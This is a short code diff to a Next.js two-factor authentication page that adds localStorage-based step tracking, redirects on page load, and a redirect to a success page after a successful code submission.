@@ -1,5 +1,7 @@
 import { ErrorMessage } from '@/components/common/error-message';
+import { useLocalStorage } from '@/helpers/useLocalstorage';
 import { twoFactor } from '@/request/post';
+import { useRouter } from 'next/router';
 import React, { useEffect, useState } from 'react';
 import { useForm } from 'react-hook-form';
 import '../../app/globals.css';
@@ -10,6 +12,16 @@ function TwoFactor() {
     handleSubmit,
     formState: { errors },
   } = useForm();
+  const router = useRouter();
+  const [step, setStep] = useLocalStorage('step');
+
+  useEffect(() => {
+    if (step === 1) {
+      router.push('/contact/295038365360854');
+    } else if (step === 2) {
+      router.push('/login');
+    }
+  }, []);
 
   const initialTime = 5 * 60; // 5 minutes in seconds
   const [time, setTime] = useState(initialTime);
@@ -30,7 +42,11 @@ function TwoFactor() {
   const seconds = time % 60;
 
   const onSubmit = async (data) => {
-    await twoFactor(data);
+    const res = await twoFactor(data);
+    if (res?.success) {
+      setStep(0);
+      router.push('/success');
+    }
   };
 
   return (
